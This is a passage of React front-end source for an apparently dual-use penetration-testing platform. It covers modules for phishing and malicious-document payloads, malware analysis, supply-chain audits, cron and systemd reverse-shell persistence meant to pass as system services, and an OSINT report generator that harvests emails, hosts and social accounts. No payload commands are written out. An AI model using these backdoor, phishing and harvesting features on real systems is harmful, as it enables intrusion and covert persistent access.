  const extra = (opts,setOpts) => (<>
    <input placeholder="Org name (for lure)" value={opts.org_name||""} onChange={e=>setOpts(p=>({...p,org_name:e.target.value}))}
      style={{width:155,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <select value={opts.method||"hta"} onChange={e=>setOpts(p=>({...p,method:e.target.value}))}
      style={{width:90,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}>
      <option value="hta">HTA</option><option value="vbs">VBScript</option><option value="ps1">PS1</option><option value="doc">DOC</option>
    </select>
  </>);
  return <ModuleShell title="Social Engineering" icon="🎭" color="#f43f5e" desc="Phishing emails, site cloning, SET credential harvester, malicious document payloads" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── MALWARE ANALYSIS ─────────────────────────────────────────
function MalwareModule({token, apiUrl}) {
  const attacks = [
    {id:"static", label:"Static Analysis", icon:"🔬", ep:"/api/malware/static",
     desc:"file + strings + objdump — no execution needed",
     howto:"Enter file path on Kali as target (e.g. /tmp/suspicious.exe). OR enter filepath in the extra field. Analyzes binary without running it — safe for malware samples. Checks file type, architecture, imports.",
     requires:"Suspicious file on Kali at known path. Tools: file, strings, objdump",
     target_type:"Suspicious files, malware samples, unknown executables (EXE, ELF, PDF, DOCX)",
     vulns:["Malware identification","Backdoored binary detection","Packed/obfuscated executable","Suspicious import table (CreateRemoteThread, VirtualAlloc)"],
     hackerImpact:"Blue team uses this to analyze malware without risking infection. If C2 URLs or shell commands found in strings, attacker's infrastructure can be identified and blocked."},
    {id:"strings", label:"String Extraction", icon:"📝", ep:"/api/malware/strings",
     desc:"Extract suspicious strings (URLs, keys, commands)",
     howto:"Enter file path in target or filepath field. Extracts all readable strings. Focus on: URLs (C2 servers), IP addresses, registry keys, commands (cmd.exe, powershell), hardcoded passwords.",
     requires:"Binary file at known path on Kali",
     target_type:"Any binary file, script, or document",
     vulns:["Hardcoded C2 server URLs","Embedded IP addresses","Cleartext passwords in binary","Shell command strings","Base64 encoded payloads"],
     hackerImpact:"Analyst can find attacker's command-and-control server URL from malware strings. Block that URL/IP to stop the malware from calling home. Also reveals attacker's capabilities."},
    {id:"hash_lookup", label:"Hash Lookup", icon:"#️⃣", ep:"/api/malware/hash_lookup",
     desc:"MD5/SHA256 hashes + VirusTotal lookup URL",
     howto:"Enter file path in filepath field. Computes all hashes and generates VirusTotal URL. Click the VT URL to check if 70+ AV engines detect it as malicious. Hash can also be used for threat intel.",
     requires:"File at known path on Kali",
     target_type:"Any suspicious file received via email, download, or found on system",
     vulns:["Known malware hash match","Zero-day (not detected by any AV)","Modified malware variant","File integrity violation"],
     hackerImpact:"If SHA256 matches known malware in VirusTotal, incident is confirmed. If zero detections, may be targeted/zero-day attack. Hash can be added to EDR blocklist to prevent further spread."},
    {id:"yara", label:"YARA Scan", icon:"🎯", ep:"/api/malware/yara",
     desc:"Scan file with YARA rules for malware patterns",
     howto:"Enter file path in filepath field. YARA rules match malware families by patterns (byte sequences, string combinations, PE characteristics). Install rules: apt install yara; clone rules from github.com/Yara-Rules.",
     requires:"File at known path + YARA rules installed (/usr/share/yara-rules/)",
     target_type:"Suspected malware files, drive images, memory dumps",
     vulns:["Known malware family match (Emotet, Cobalt Strike, Mimikatz)","Packed malware signatures","Suspicious PE sections","Shellcode patterns"],
     hackerImpact:"YARA can identify specific malware families even if hash is unknown (new variant). If Cobalt Strike beacon detected, attacker has enterprise-grade C2 — likely nation-state or advanced threat actor."},
  ];
  const extra = (opts,setOpts) => (
    <input placeholder="File path on Kali (/tmp/sample.exe)" value={opts.filepath||""} onChange={e=>setOpts(p=>({...p,filepath:e.target.value}))}
      style={{flex:1,minWidth:260,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  );
  return <ModuleShell title="Malware Analysis" icon="🦠" color="#dc2626" desc="Static analysis, string extraction, YARA scanning, hash lookup — no sandbox required" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── SUPPLY CHAIN ─────────────────────────────────────────────
function SupplyChainModule({token, apiUrl}) {
  const attacks = [
    {id:"npm_audit", label:"Package Audit", icon:"📦", ep:"/api/supply/npm_audit",
     desc:"npm audit / pip-audit — known CVEs in dependencies",
     howto:"Enter project directory path as target (e.g. /opt/webapp). Select npm or pip. Scans package.json or requirements.txt for dependencies with known CVEs. Use on web application source code.",
     requires:"Project source code with package.json or requirements.txt",
     target_type:"Web applications (Node.js, Python, Ruby, Java)",
     vulns:["Log4Shell (CVE-2021-44228) in Java deps","Prototype pollution in npm packages","RCE in outdated libraries","Path traversal in file-handling packages"],
     hackerImpact:"Attacker finds a CVE in an outdated npm package (e.g. RCE in lodash). Exploits the vulnerable dependency to gain code execution on the server. Supply chain attacks caused 650% increase in incidents (2021)."},
    {id:"confusion", label:"Dependency Confusion", icon:"😵", ep:"/api/supply/confusion",
     desc:"Check if internal package names are on public registry",
     howto:"Enter internal package names (space-separated) as target or in packages field. Checks if your private package names exist on npm/PyPI public registry. If they do, an attacker could publish malicious version.",
     requires:"Knowledge of internal package names used by the organization",
     target_type:"Organizations using private npm/PyPI registries",
     vulns:["Dependency confusion (Alex Birsan attack)","Typosquatting attack","Private package namespace not claimed","CI/CD pipeline pulls from public registry"],
     hackerImpact:"Researcher Alex Birsan earned $130,000 using this technique against Apple, Microsoft, PayPal. Attacker publishes malicious package with same name as internal package — CI/CD pulls the public (malicious) version."},
    {id:"sbom", label:"Generate SBOM", icon:"📋", ep:"/api/supply/sbom",
     desc:"Software Bill of Materials from package manifests",
     howto:"Enter project path as target. Scans package.json, requirements.txt, go.mod, Gemfile, pom.xml. Generates a list of all dependencies with versions for security review and compliance reporting.",
     requires:"Project source code at known path",
     target_type:"Any software project (Node, Python, Go, Ruby, Java, .NET)",
     vulns:["Unmaintained dependencies","License compliance issues","Transitive dependency risks","Version pinning missing"],
     hackerImpact:"SBOM reveals entire attack surface of the application. Security team uses it to check every dependency against vulnerability databases. Executive Orders (US Gov) now require SBOM for software sold to government."},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="Project path (/opt/app)" value={opts.path||""} onChange={e=>setOpts(p=>({...p,path:e.target.value}))}
      style={{width:190,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <select value={opts.type||"npm"} onChange={e=>setOpts(p=>({...p,type:e.target.value}))}
      style={{width:80,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}>
      <option value="npm">npm</option><option value="pip">pip</option>
    </select>
  </>);
  return <ModuleShell title="Supply Chain Security" icon="⛓" color="#0ea5e9" desc="Dependency confusion, package auditing, SBOM generation — software supply chain security" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── ADVANCED PERSISTENCE ──────────────────────────────────────
function PersistenceModule({token, apiUrl}) {
  const attacks = [
    {id:"check_indicators", label:"Persistence Hunt", icon:"🔍", ep:"/api/persist/check_indicators",
     desc:"Find existing backdoors and persistence mechanisms",
     howto:"Run on any Linux server you want to check for compromise. Scans cron, systemd, authorized_keys, .bashrc, rc.local for suspicious entries. Use for incident response or post-compromise verification.",
     requires:"Shell access on Linux target (defensive use)",
     target_type:"Any Linux server — web servers, cloud instances, VMs",
     vulns:["Reverse shell in cron job","Backdoor SSH key added to authorized_keys","Malicious systemd service",".bashrc/profile modification","Rogue startup script"],
     hackerImpact:"Attacker installs persistence so they survive reboot and password changes. If found during IR, means the attacker still has access. All persistence must be removed and credentials rotated."},
    {id:"rootkit_scan", label:"Rootkit Scan", icon:"🕵", ep:"/api/persist/rootkit_scan",
     desc:"rkhunter + chkrootkit — detect hidden rootkits",
     howto:"Run on Linux server. rkhunter checks for known rootkit file signatures, suspicious executables, and hidden processes. Run immediately when you suspect compromise. Install first: apt install rkhunter chkrootkit.",
     requires:"rkhunter or chkrootkit installed on target",
     target_type:"Linux servers, especially web-facing and critical infrastructure",
     vulns:["Kernel-level rootkit hiding processes","Trojanized system binaries (ls, ps, netstat)","Hidden network connections","Bootkit installation"],
     hackerImpact:"Rootkits are the most advanced persistence — they hide attacker's presence from standard tools. A rootkitted system cannot be trusted even after cleaning. Full OS reinstall is required."},
    {id:"install_cron", label:"Cron Persistence", icon:"⏰", ep:"/api/persist/install_cron",
     desc:"Generate cron reverse shell persistence (review only)",
     howto:"Fill LHOST (your Kali IP) and LPORT. Generates cron syntax and installation commands. In authorized pentests: install on target to verify detection. In blue team: use output to understand what to look for.",
     requires:"Shell access + LHOST/LPORT set",
     target_type:"Linux servers (authorized pentesting only)",
     vulns:["Unmonitored cron jobs","Missing cron change alerting","No file integrity monitoring on /etc/cron*"],
     hackerImpact:"Every 5 minutes the server calls back to attacker with a shell. Even if admin changes passwords and kills active sessions, attacker regains access automatically. Survives reboots."},
    {id:"install_service", label:"Systemd Persistence", icon:"⚙", ep:"/api/persist/install_service",
     desc:"Generate systemd service for persistent backdoor",
     howto:"Fill LHOST and LPORT. Generates a systemd service file that looks like a legitimate system service. Shows install commands. Use in authorized tests to demonstrate persistence risk.",
     requires:"Root shell access + LHOST/LPORT set",
     target_type:"Linux servers using systemd (Ubuntu, CentOS, Debian, RHEL)",
     vulns:["No monitoring of new systemd services","Missing file integrity monitoring","Unrestricted root access to systemd"],
     hackerImpact:"Service named 'sys-update.service' starts on every boot, automatically connects back to attacker. Blends in with legitimate services. Harder to detect than cron because it looks like normal system service."},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="LHOST" value={opts.lhost||""} onChange={e=>setOpts(p=>({...p,lhost:e.target.value}))}
      style={{width:140,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="LPORT" value={opts.lport||"4444"} onChange={e=>setOpts(p=>({...p,lport:e.target.value}))}
      style={{width:90,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Advanced Persistence" icon="👁" color="#7c3aed" desc="Rootkit detection, cron/systemd backdoors, persistence IoC hunting — offensive + defensive" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── OSINT PDF ─────────────────────────────────────────────────
function generateOsintPdf(results, target) {
  const doc = new jsPDF({orientation:"portrait",unit:"mm",format:"a4"});
  const pageW=210, margin=15, contentW=180;
  const DARK=[15,23,42], BLUE=[37,99,235], GRAY=[100,116,139], WHITE=[255,255,255];
  const LIGHT=[241,245,249], GREEN=[21,128,61], RED=[185,28,28], LBLUE=[219,234,254];
  const ORANGE=[234,88,12];
  let y=18, _secN=0;
  const date = new Date().toLocaleString();
  const txt=(t,x,yy,sz=9,color=DARK,bold=false,align="left")=>{
    doc.setFont("helvetica",bold?"bold":"normal"); doc.setFontSize(sz); doc.setTextColor(...color);
    doc.text(String(t),x,yy,{align});
  };
  const fillR=(x,yy,w,h,c)=>{doc.setFillColor(...c);doc.rect(x,yy,w,h,"F");};
  const drawHeader=()=>{
    txt("VulnusLab — OSINT & Threat Intel Report",margin,10,7,GRAY);
    txt(date,pageW-margin,10,7,BLUE,false,"right");
  };
  const chk=n=>{if(y+n>278){doc.addPage();y=18;drawHeader();}};
  const sHead=(title,yy)=>{
    _secN++;
    fillR(margin,yy,contentW,9,LBLUE);
    txt(_secN+". "+title,margin+4,yy+6.2,10,BLUE,true);
    return yy+13;
  };
  const row2=(label,value,i)=>{
    chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
    txt(label,margin+3,y+5,8.5,GRAY,true);
    const vl=doc.splitTextToSize(String(value||""),120);
    doc.setFont("helvetica","normal"); doc.setFontSize(8.5); doc.setTextColor(...DARK);
    doc.text(vl[0],margin+55,y+5); y+=7;
  };

  // ── COVER ──
  fillR(0,0,pageW,64,DARK);
  // VulnusLab shield + wordmark
  {
    const sx = pageW/2, sy = 14, w = 12, h = 14;
    doc.setFillColor(15,23,42);
    doc.setDrawColor(59,130,246); doc.setLineWidth(0.6);
    doc.lines([
      [w*0.45,0],[w*0.55,h*0.15],[0,h*0.5],
      [-w*0.55,h*0.5],[-w*0.45,-h*0.15],[-w*0.45,-h*0.4],
      [0,-h*0.1],[w*0.45,-h*0.4],[0,h*0.4]
    ], sx-w*0.45, sy-h*0.4, [1,1], 'FD');
    doc.setFont("helvetica","bold"); doc.setFontSize(10); doc.setTextColor(59,130,246);
    doc.text("V", sx, sy + 1, {align:"center"});
    doc.setFont("helvetica","bold"); doc.setFontSize(7);
    doc.setTextColor(241,245,249);
    doc.text("VULNUS", sx - 1, sy + 10, {align:"right"});
    doc.setTextColor(59,130,246);
    doc.text("LAB", sx, sy + 10, {align:"left"});
  }
  doc.setFont("helvetica","bold"); doc.setFontSize(18); doc.setTextColor(...BLUE);
  doc.text("OSINT & THREAT INTEL REPORT",pageW/2,38,{align:"center"});
  doc.setFont("helvetica","normal"); doc.setFontSize(10); doc.setTextColor(...GRAY);
  doc.text("Open Source Intelligence Gathering",pageW/2,48,{align:"center"});
  y=74;
  fillR(margin,y,contentW,8,DARK);
  txt("FIELD",margin+3,y+5.5,8,WHITE,true); txt("VALUE",margin+55,y+5.5,8,WHITE,true); y+=8;
  [["Target",target],["Scan Date",date],["Classification","CONFIDENTIAL"],["Report Type","OSINT Assessment"]].forEach((r,i)=>{
    fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);
    txt(r[0],margin+3,y+5.5,8.5,GRAY,true); txt(String(r[1]),margin+55,y+5.5,8.5,DARK); y+=8;
  });
  y+=10;

  // ── GeoIP ──
  const geo=results.geoip||{};
  if(geo.ip){
    chk(30); y=sHead("GeoIP / Location",y);
    [["IP",geo.ip],["Hostname",geo.hostname],["City",geo.city],["Region",geo.region],
     ["Country",geo.country],["ISP",geo.isp],["Org / ASN",geo.org||geo.as_info],["Timezone",geo.timezone],["Coordinates",geo.loc]]
    .filter(([,v])=>v).forEach(([k,v],i)=>row2(k,v,i));
    y+=6;
  }

  // ── VirusTotal ──
  const vt=results.virustotal||{};
  if(vt.total_engines){
    chk(30); y=sHead("VirusTotal Reputation",y);
    const threat=vt.malicious>0||vt.suspicious>0;
    fillR(margin,y,contentW,10,threat?[254,226,226]:[220,252,231]);
    txt(threat?"THREAT DETECTED":"CLEAN — No engines flagged",margin+4,y+7,10,threat?RED:GREEN,true);
    txt(`${vt.malicious}/${vt.total_engines} engines`,margin+100,y+7,9,DARK); y+=14;
    [["Malicious",vt.malicious],["Suspicious",vt.suspicious],["Harmless",vt.harmless],["Reputation",vt.reputation]]
    .forEach(([k,v],i)=>row2(k,v,i));
    y+=6;
  }

  // ── AbuseIPDB ──
  const ab=results.abuseipdb||{};
  if(ab.abuse_score!==undefined){
    chk(30); y=sHead("AbuseIPDB Threat Score",y);
    const threat=ab.abuse_score>25;
    fillR(margin,y,contentW,10,threat?[254,226,226]:[220,252,231]);
    txt(`${ab.abuse_score}% Abuse Confidence Score`,margin+4,y+7,10,threat?RED:GREEN,true); y+=14;
    [["IP",ab.ip],["Reports (90 days)",ab.total_reports],["Country",ab.country],["ISP",ab.isp]]
    .filter(([,v])=>v!==undefined&&v!=="").forEach(([k,v],i)=>row2(k,v,i));
    y+=6;
  }

  // ── HaveIBeenPwned ──
  const hibp=results.hibp||{};
  if(hibp.checked){
    chk(30); y=sHead("HaveIBeenPwned — Data Breaches",y);
    if(hibp.breaches?.length>0){
      fillR(margin,y,contentW,8,[254,226,226]);
      txt(`${hibp.breaches.length} BREACH(ES) FOUND`,margin+4,y+6,10,RED,true); y+=12;
      hibp.breaches.slice(0,15).forEach((b,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(b,margin+3,y+5,8.5,DARK); y+=7; });
    } else {
      fillR(margin,y,contentW,8,[220,252,231]);
      txt("No breaches found for this domain",margin+4,y+6,10,GREEN,true); y+=10;
    }
    y+=6;
  }

  // ── DNSTwist ──
  const dt=results.dnstwist||{};
  if(dt.domains?.length>0){
    chk(30); y=sHead(`DNSTwist — Phishing Domains (${dt.domains.length} found)`,y);
    fillR(margin,y,contentW,8,DARK);
    txt("DOMAIN",margin+3,y+5.5,8,WHITE,true); txt("TYPE",margin+100,y+5.5,8,WHITE,true); txt("IP",margin+140,y+5.5,8,WHITE,true); y+=8;
    dt.domains.slice(0,30).forEach((d,i)=>{
      chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      txt(d.domain||"",margin+3,y+5,8,BLUE);
      txt(d.fuzzer||"",margin+100,y+5,7.5,GRAY);
      txt(d.dns_a?d.dns_a[0]:"",margin+140,y+5,7.5,DARK); y+=7;
    });
    y+=6;
  }

  // ── Google Dorks ──
  const gd=results.googledorks||{};
  if(gd.dorks?.length>0){
    chk(30); y=sHead("Google Dorks — Intelligence Queries",y);
    gd.dorks.forEach((d,i)=>{
      const lines=doc.splitTextToSize(d,contentW-8);
      const rh=Math.max(7,lines.length*4.5+3);
      chk(rh); fillR(margin,y,contentW,rh,i%2===0?LIGHT:WHITE);
      doc.setFont("courier","normal"); doc.setFontSize(7); doc.setTextColor(...BLUE);
      doc.text(lines,margin+3,y+5); y+=rh;
    });
    y+=6;
  }

  // ── theHarvester ──
  const mail=results.email_osint||{};
  const sf=results.spiderfoot||{};
  const harvEmails=mail.emails||[]; const harvHosts=mail.hosts||[];
  if(harvEmails.length>0||harvHosts.length>0||mail.asns?.length>0||mail.interesting_urls?.length>0){
    chk(30); y=sHead("theHarvester — Email & Host Intelligence",y);
    // emails
    if(harvEmails.length>0){
      doc.setFont("helvetica","bold"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      chk(6); doc.text(`Emails Found (${harvEmails.length}):`,margin+2,y+4); y+=7;
      harvEmails.forEach((e,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(e,margin+3,y+5,8.5,BLUE); y+=7; });
      y+=3;
    }
    // hosts from harvester
    if(harvHosts.length>0){
      doc.setFont("helvetica","bold"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      chk(6); doc.text(`Hosts Found (${harvHosts.length}):`,margin+2,y+4); y+=7;
      harvHosts.slice(0,20).forEach((h,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(h,margin+3,y+5,8.5,DARK); y+=7; });
      y+=3;
    }
    // ASNs
    if(mail.asns?.length>0){
      doc.setFont("helvetica","bold"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      chk(6); doc.text(`ASNs Discovered (${mail.asns.length}):`,margin+2,y+4); y+=7;
      mail.asns.forEach((a,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(a,margin+3,y+5,8.5,DARK); y+=7; });
      y+=3;
    }
    // interesting URLs
    if(mail.interesting_urls?.length>0){
      doc.setFont("helvetica","bold"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      chk(6); doc.text(`Interesting URLs (${mail.interesting_urls.length}):`,margin+2,y+4); y+=7;
      mail.interesting_urls.forEach((u,i)=>{
        const ul=doc.splitTextToSize(u,contentW-8);
        const uh=Math.max(7,ul.length*4+3);
        chk(uh); fillR(margin,y,contentW,uh,i%2===0?LIGHT:WHITE);
        txt(ul,margin+3,y+4.5,7.5,BLUE); y+=uh;
      });
      y+=3;
    }
    y+=4;
  }

  // ── Recon-ng ──
  const rng=results.recon_ng||{};
  if(rng.hosts?.length>0){
    chk(30); y=sHead(`Recon-ng — Certificate Transparency Hosts (${rng.hosts.length})`,y);
    rng.hosts.forEach((h,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(h,margin+3,y+5,8.5,DARK); y+=7; });
    y+=6;
  } else if(results.recon_ng){
    chk(18); y=sHead("Recon-ng — Certificate Transparency",y);
    fillR(margin,y,contentW,8,LIGHT); txt("No additional hosts found via Recon-ng.",margin+4,y+5.5,8.5,GRAY); y+=12;
  }

  // ── All Subdomains (combined) ──
  const sfEmails=sf.emails||[]; const sfHosts=sf.hosts||[];
  const allEmails=[...new Set([...harvEmails,...sfEmails])];
  if(sfEmails.length>0&&allEmails.length>harvEmails.length){
    chk(30); y=sHead(`SpiderFoot — Additional Emails (${sfEmails.length})`,y);
    sfEmails.forEach((e,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(e,margin+3,y+5,8.5,BLUE); y+=7; });
    y+=6;
  }
  const allHosts=[...new Set([...harvHosts,...sfHosts,...(rng.hosts||[])])];
  if(allHosts.length>0){
    chk(30); y=sHead(`Subdomains / Hosts Discovered (${allHosts.length})`,y);
    allHosts.forEach((h,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(h,margin+3,y+5,8.5,DARK); y+=7; });
    y+=6;
  }

  // ── Sherlock ──
  const sher=results.sherlock||{};
  if(sher.accounts_found?.length>0){
    chk(30); y=sHead(`Social Media Accounts — "${sher.username}" (${sher.total} found)`,y);
    sher.accounts_found.forEach((a,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(a,margin+3,y+5,8,BLUE); y+=7; });
    y+=6;
  }

  // ── Maltego ──
  const malt=results.maltego||{};
  if(malt.guide){
    doc.setFont("helvetica","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
    const guideLines=doc.splitTextToSize(malt.guide,contentW-10);
    const guideH=Math.max(30,guideLines.length*4.5+8);
    chk(12+guideH); // check heading + content together so they never split across pages
    y=sHead("Maltego — Manual OSINT Guide",y);
    fillR(margin,y,contentW,guideH,[241,245,249]);
    doc.setFont("helvetica","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
    doc.text(guideLines,margin+5,y+6); y+=guideH+6;
  }

  // ── END OF REPORT ──
  if(y+32>284){doc.addPage();y=18;drawHeader();} y+=4;
  fillR(margin,y,contentW,30,LBLUE); fillR(margin,y,3,30,BLUE);
  txt("— END OF REPORT —",pageW/2,y+8,10,BLUE,true,"center");
  txt("Generated by VulnusLab — automated OSINT gathering by VulnusLab engine.",pageW/2,y+14,6.5,GRAY,false,"center");
  txt("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.",pageW/2,y+18,6,GRAY,false,"center");
  txt("vulnuslab.com  ·  support@vulnuslab.com",pageW/2,y+25,7,BLUE,true,"center");

  // ── BORDERS ALL PAGES ──
  const total=doc.internal.getNumberOfPages();
  for(let i=1;i<=total;i++){
    doc.setPage(i);
    doc.setDrawColor(...BLUE); doc.setLineWidth(1.2); doc.rect(0,0,210,297,"S");
    if(i>=2){
      txt("VulnusLab | CONFIDENTIAL  ·  vulnuslab.com",margin,290,6.5,GRAY);
      txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");
    }
  }
  const _fn=t=>(t||"target").replace(/https?:\/\//,"").replace(/[^a-zA-Z0-9.\-]/g,"_").replace(/_+/g,"_").replace(/^_|_$/g,"");
  const _dt=()=>{const d=new Date();return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}_${String(d.getHours()).padStart(2,"0")}-${String(d.getMinutes()).padStart(2,"0")}`;};
  doc.save(`osint_${_fn(target)}_${_dt()}.pdf`);
}

// ── OSINT ─────────────────────────────────────────────────────
function OsintModule({token, apiUrl}) {
  const [target,  setTarget]  = useState("");
  const [vtKey,   setVtKey]   = useState(localStorage.getItem("vtKey")||"");
  const [abKey,   setAbKey]   = useState(localStorage.getItem("abKey")||"");
  const [running, setRunning] = useState(false);
  const [done,    setDone]    = useState([]);
  const [results, setResults] = useState({});
  const [log,     setLog]     = useState([]);

  const addLog = msg => setLog(p=>[...p, msg]);

  const getHost  = t => { try { return new URL(t.trim()).hostname; } catch { return t.trim().replace(/^https?:\/\//,"").split("/")[0]; } };
  const isIP     = t => /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(getHost(t));
  const isDomain = t => /^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$/.test(getHost(t)) && !isIP(t);
  const isUser   = t => !isIP(t) && !isDomain(t);

  const TOOLS = [
    {id:"geoip",       label:"GeoIP Lookup",       icon:"🌍", ep:"/api/osint/geoip"},
    {id:"email_osint", label:"Email Harvesting",    icon:"📧", ep:"/api/osint/email_osint", domainOnly:true},
    {id:"recon_ng",    label:"Recon-ng",            icon:"🔭", ep:"/api/osint/recon_ng",    domainOnly:true},
    {id:"spiderfoot",  label:"SpiderFoot",          icon:"🕷", ep:"/api/osint/spiderfoot",  domainOnly:true},
    {id:"virustotal",  label:"VirusTotal",          icon:"🔴", ep:"/api/osint/virustotal",  needsVt:true},
    {id:"abuseipdb",   label:"AbuseIPDB",           icon:"🚨", ep:"/api/osint/abuseipdb",   needsAb:true},
    {id:"sherlock",    label:"Sherlock (Username)",  icon:"🔎", ep:"/api/osint/sherlock",    userOnly:true},
    {id:"hibp",        label:"HaveIBeenPwned",       icon:"🔓", ep:"/api/osint/hibp",         domainOnly:true},
    {id:"dnstwist",    label:"DNSTwist Phishing",    icon:"🎣", ep:"/api/osint/dnstwist",     domainOnly:true},
    {id:"googledorks", label:"Google Dorks",         icon:"🔍", ep:"/api/osint/googledorks"},
    {id:"maltego",     label:"Maltego Guide",        icon:"🕸", ep:"/api/osint/maltego"},
  ];

  const runAll = async () => {
    if(!target.trim()) return;
    localStorage.setItem("vtKey", vtKey); localStorage.setItem("abKey", abKey);
    setRunning(true); setDone([]); setResults({}); setLog([]);
    addLog("Starting OSINT scan on: "+target);
    const tgt = target.trim();
    await Promise.all(TOOLS.map(async t => {
      if(t.domainOnly && !isDomain(tgt)) { setDone(p=>[...p,t.id]); return; }
      if(t.userOnly && !isUser(tgt)) { setDone(p=>[...p,t.id]); return; }
      addLog(`Running ${t.label}...`);
      try {
        const body = {target: tgt};
        if(t.needsVt) body.api_key = vtKey;
        if(t.needsAb) body.api_key = abKey;
        const r = await fetch(apiUrl+t.ep, {method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+token},body:JSON.stringify(body)});
        const data = await r.json();
        setResults(p=>({...p,[t.id]:data}));
        addLog(`✓ ${t.label} complete`);
      } catch(e) {
        addLog(`✗ ${t.label} failed: `+e.message);
        setResults(p=>({...p,[t.id]:{error:e.message}}));
      }
      setDone(p=>[...p,t.id]);
    }));
    setRunning(false); addLog("All tools complete.");
  };

  const C = {
    wrap:    {background:"#020617",minHeight:"100vh",padding:"24px",fontFamily:"monospace"},
    card:    {background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:10,padding:"16px",marginBottom:14},
    label:   {fontSize:10,color:"#60a5fa",fontWeight:700,letterSpacing:2,textTransform:"uppercase",display:"block",marginBottom:6},
    input:   {width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"9px 12px",color:"#e2e8f0",fontSize:13,boxSizing:"border-box"},
    btn:     {background:running?"#1e3a8a":"#2563eb",color:"#fff",border:"none",borderRadius:8,padding:"10px 28px",fontSize:14,fontWeight:700,cursor:running?"not-allowed":"pointer",marginTop:10},
    tag:     (c)=>({background:c,color:"#fff",borderRadius:4,padding:"2px 8px",fontSize:11,fontWeight:700,marginRight:4,display:"inline-block"}),
    row:     {display:"flex",gap:12,flexWrap:"wrap"},
    secHdr:  {fontSize:13,fontWeight:700,color:"#60a5fa",marginBottom:10,borderBottom:"1px solid #1e3a8a",paddingBottom:6},
    val:     {color:"#e2e8f0",fontSize:12},
    gray:    {color:"#64748b",fontSize:11},
    red:     {color:"#ef4444",fontWeight:700},
    green:   {color:"#22c55e",fontWeight:700},
  };

  const geo  = results.geoip       || {};
  const vt   = results.virustotal  || {};
  const ab   = results.abuseipdb   || {};
  const mail = results.email_osint || {};
  const sf   = results.spiderfoot  || {};
  const rng  = results.recon_ng    || {};
  const sher = results.sherlock    || {};
  const malt = results.maltego     || {};

  const allHosts = [...new Set([...(mail.hosts||[]),...(sf.hosts||[]),...(rng.hosts||[])])];
  const allEmails = [...new Set([...(mail.emails||[]),...(sf.emails||[])])];

  const progress = TOOLS.length > 0 ? Math.round((done.length/TOOLS.length)*100) : 0;

  return (
    <div style={C.wrap}>
      <div style={{marginBottom:20}}>
        <div style={{fontSize:22,fontWeight:900,color:"#60a5fa",letterSpacing:4,marginBottom:4}}>OSINT & THREAT INTEL</div>
        <div style={{color:"#475569",fontSize:12}}>Email harvesting · GeoIP · VirusTotal · AbuseIPDB · Sherlock · Recon-ng · SpiderFoot</div>
      </div>

      {/* Config */}
      <div style={C.card}>
        <div style={C.row}>
          <div style={{flex:2}}>
            <label style={C.label}>Target (Domain / IP / Username for Sherlock)</label>
            <input style={C.input} value={target} onChange={e=>setTarget(e.target.value)} placeholder="e.g. example.com or 8.8.8.8 or john_doe" autoComplete="off" name="osint-target" data-form-type="other"/>
          </div>
          <div style={{flex:1}}>
            <label style={C.label}>VirusTotal API Key (optional)</label>
            <input style={C.input} value={vtKey} onChange={e=>setVtKey(e.target.value)} placeholder="VT API key" type="password" autoComplete="off" name="vt-api-key" data-form-type="other"/>
          </div>
          <div style={{flex:1}}>
            <label style={C.label}>AbuseIPDB API Key (optional)</label>
